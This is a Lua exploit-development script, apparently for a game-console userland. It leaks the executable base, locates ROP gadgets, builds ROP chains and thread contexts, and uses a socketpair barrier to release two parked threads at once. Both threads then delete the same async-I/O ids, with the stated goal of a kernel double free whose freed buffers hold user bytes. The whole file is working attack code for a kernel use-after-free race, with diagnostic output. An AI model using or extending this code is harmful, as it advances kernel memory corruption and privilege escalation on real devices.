-- CRASH_CLASS: HIGH
-- PROBE 791d: start two aio deletes together with a socket barrier
--
-- Context: 791c proved the shape works (control child deletes all 48 last
-- items, statuses all 0) but the two race children never overlapped: one=48,
-- none=0 in both runs, because a child's thr_create return happens after the
-- first child has already finished its microsecond-long 48-id walk. Spawn
-- order alone cannot align them.
--
-- So the children are parked instead: each enters read(2) on its own
-- socketpair, and the parent wakes both with two back-to-back write(2) calls.
-- The children then run the same 48-id delete on 16 CPUs within microseconds
-- of each other.
--
-- Each remaining id is the LAST item of its 2-item block, i.e. path A:
--   8ad6fede mov rdi,r14 / call free      ; C
--   8ad7009f mov rdi,[r8+0x10] / call free ; S
--   8ad700a8 mov rdi,[r12+0x20] / call free; D  (user bytes)
--   8ad700b9 mov rdi,[r12+0x28] / call free; P
--   8ad700cd mov rdi,r12 / call free       ; T
-- Two callers past the [T+2]==1 read free all five twice. Every id both
-- children report 0 for is a candidate double free; the health cycles after
-- it are the corruption test.

print("=== PROBE 791d: socket-barrier last-item race ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[0] gadgets missing") return end
print(string.format("[0] eboot=%X gadgets ok", ebase))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}

-- The child enters at fn with RAX = read and blocks on its socket; the parent's
-- write releases it straight into the chain that issues the 662.
local STACK = page*4
local function spawn_parked(fd, idpage, count, statpage)
    local block = mmap(STACK)
    local base = block + STACK - 0x200
    local p = base
    wq(p, uint64(pop_rdi)); wq(p+8,  uint64(idpage))
    wq(p+16, uint64(pop_rsi)); wq(p+24, uint64(count))
    wq(p+32, uint64(pop_rdx)); wq(p+40, uint64(statpage))
    wq(p+48, uint64(pop_rax)); wq(p+56, uint64(662))
    wq(p+64, uint64(fn))
    wq(p+72, uint64(pop_rax)); wq(p+80, uint64(431))
    wq(p+88, uint64(fn));      wq(p+96, uint64(jmp_g))
    local buf = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(fd));      wq(ctx+Ctx.RSI, uint64(buf))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(READ))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local fds = memory.alloc(8)
local function pairsock()
    wd(fds, 0xFFFFFFFF); wd(fds+4, 0xFFFFFFFF)
    local ok, rv = pcall(function() return mk(SOCKETPAIR)(uint64(1), uint64(1), uint64(0), uint64(fds)) end)
    if not (ok and to_num(rv) == 0) then return nil, nil end
    return rd(fds), rd(fds+4)
end
local one = mmap(page)
wb(one, 0x41)

local data = mmap(page)
wd(data+0x20, 0x2A)

local M = 48
local function build()
    local first, last = {}, {}
    local made = 0
    for k=1,M do
        local o = mmap(page)
        local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(2), uint64(1), uint64(o)) end)
        if okc and to_num(rvc) == 0 then
            local b = rd(o) or 0
            made = made + 1
            first[made] = b
            last[made]  = b + 0x10000
        end
    end
    return first, last, made
end
local function walk_to_last(first, last, made)
    local allids = mmap(page)
    for k=1,made do
        wd(allids + (k-1)*4, first[k])
        wd(allids + (made + k-1)*4, last[k])
    end
    local pp = mmap(page)
    local okp, rvp = pcall(function() return mk(664)(uint64(allids), uint64(made*2), uint64(pp)) end)
    local n3 = 0
    for k=0,made*2-1 do if (rd(pp + k*4) or 0) == 3 then n3 = n3 + 1 end end
    local firsts = mmap(page)
    for k=1,made do wd(firsts + (k-1)*4, first[k]) end
    local fst = mmap(page)
    local okf, rvf = pcall(function() return mk(662)(uint64(firsts), uint64(made), uint64(fst)) end)
    local fz = 0
    for k=0,made-1 do if (rd(fst + k*4) or -1) == 0 then fz = fz + 1 end end
    local lasts = mmap(page)
    for k=1,made do wd(lasts + (k-1)*4, last[k]) end
    return n3, to_num(rvf), fz, lasts
end

-- [A] control: one parked child, one write
local first, last, made = build()
print(string.format("[A] blocks=%d/%d first=%08X last=%08X", made, M, first[1] or 0, last[1] or 0))
if made ~= M then print("=== PROBE 791d ABORT ===") return end
local n3, frv, fz, lasts = walk_to_last(first, last, made)
print(string.format("[B] poll3=%d/%d first deletes rv=%s zeros=%d/%d", n3, M*2, tostring(frv), fz, M))
if fz ~= M then print("=== PROBE 791d ABORT ===") return end

local ra, wa = pairsock()
if not ra then print("[C] socketpair failed"); return end
local ctl = mmap(page)
local okc, tidc = spawn_parked(ra, lasts, M, ctl)
sleep_ms(120)
local wz = pcall(function() return mk(WRITE)(uint64(wa), uint64(one), uint64(1), uint64(0), uint64(0)) end)
sleep_ms(200)
local cz = 0
local cfirst = {}
for k=0,M-1 do
    local v = rd(ctl + k*4) or 0
    if v == 0 then cz = cz + 1 end
    if k < 6 then cfirst[#cfirst+1] = string.format("%08X", v) end
end
print(string.format("[C] control parked ok=%s tid=%X write=%s zeros=%d/%d first=%s",
    tostring(okc), tidc, tostring(wz), cz, M, table.concat(cfirst, " ")))

-- [D] race: two parked children, two writes back to back
local first2, last2, made2 = build()
if made2 ~= M then print("[D] rebuild short " .. made2); return end
local n32, frv2, fz2, lasts2 = walk_to_last(first2, last2, made2)
print(string.format("[D] rebuilt poll3=%d/%d first zeros=%d/%d", n32, M*2, fz2, M))
if fz2 ~= M then print("=== PROBE 791d ABORT ===") return end

local r1, w1 = pairsock()
local r2, w2 = pairsock()
if not (r1 and r2) then print("[E] socketpairs failed"); return end
local sA, sB = mmap(page), mmap(page)
for i=0,M-1 do wd(sA + i*4, 0xAAAAAAAA); wd(sB + i*4, 0xBBBBBBBB) end
local okA, tidA = spawn_parked(r1, lasts2, M, sA)
local okB, tidB = spawn_parked(r2, lasts2, M, sB)
print(string.format("[E] parked children ok=%s/%s tids=%X/%X", tostring(okA), tostring(okB), tidA, tidB))
sleep_ms(120)
local w1ok = pcall(function() return mk(WRITE)(uint64(w1), uint64(one), uint64(1), uint64(0), uint64(0)) end)
local w2ok = pcall(function() return mk(WRITE)(uint64(w2), uint64(one), uint64(1), uint64(0), uint64(0)) end)
print(string.format("[E] release writes ok=%s/%s", tostring(w1ok), tostring(w2ok)))
sleep_ms(250)

local dbl, onec, nones, oth = {}, 0, 0, {}
for k=0,M-1 do
    local a, b = rd(sA + k*4) or 0, rd(sB + k*4) or 0
    local za = (a == 0) and 1 or 0
    local zb = (b == 0) and 1 or 0
    if za + zb == 2 then dbl[#dbl+1] = k
    elseif za + zb == 1 then onec = onec + 1
    else nones = nones + 1 end
    if (a ~= 0 and a ~= 0x80020003) or (b ~= 0 and b ~= 0x80020003) then
        oth[#oth+1] = string.format("%d:%08X/%08X", k, a, b)
    end
end
print(string.format("[F] two-zero ids=%d one=%d none=%d", #dbl, onec, nones))
if #dbl > 0 then
    local s = {}
    for i=1,math.min(#dbl, 20) do s[#s+1] = dbl[i] end
    print("[F] double ids: " .. table.concat(s, ","))
end
print("[F] unexpected: [" .. table.concat(oth, " ") .. "]")

local bad = 0
for k=1,8 do
    local o, qp, st = mmap(page), mmap(page), mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    local ok2, rv2 = pcall(function() return mk(664)(uint64(o), uint64(1), uint64(qp)) end)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(st)) end)
    local id, ps, ds = rd(o) or 0, rd(qp) or 0, rd(st) or 0
    if not (ok1 and to_num(rv1) == 0 and ok3 and to_num(rv3) == 0 and ds == 0 and ps == 3) then bad = bad + 1 end
    print(string.format("[G] %d create=%s/%s id=%08X state=%08X del=%s/%08X",
        k, tostring(ok1), tostring(to_num(rv1)), id, ps, tostring(ok3), ds))
end
print(string.format("[H] health anomalies=%d/8", bad))
print("=== PROBE 791d DONE ===")
